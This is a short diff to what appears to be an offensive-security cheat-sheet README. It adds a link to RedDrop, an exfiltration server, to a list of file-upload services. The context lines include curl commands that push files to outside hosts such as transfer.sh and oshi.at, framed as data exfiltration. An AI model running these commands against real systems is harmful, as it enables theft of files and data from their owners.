@@ -1724,6 +1724,7 @@ Tunneling
 
 Exfil<a id="cloudexfil"></a>
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - `blitz -l` / `blitz foo.txt`
+2. [RedDrop](https://github.com/cyberbutler/RedDrop) - run your own Exfil Server
 1. [Mega](https://mega.io/cmd)
 2. [oshiAt](https://oshi.at/) - also on TOR. `curl -T foo.txt https://oshi.at`
 5. [Transfer.sh](https://transfer.sh/) - `curl -T foo.txt https://transfer.sh`
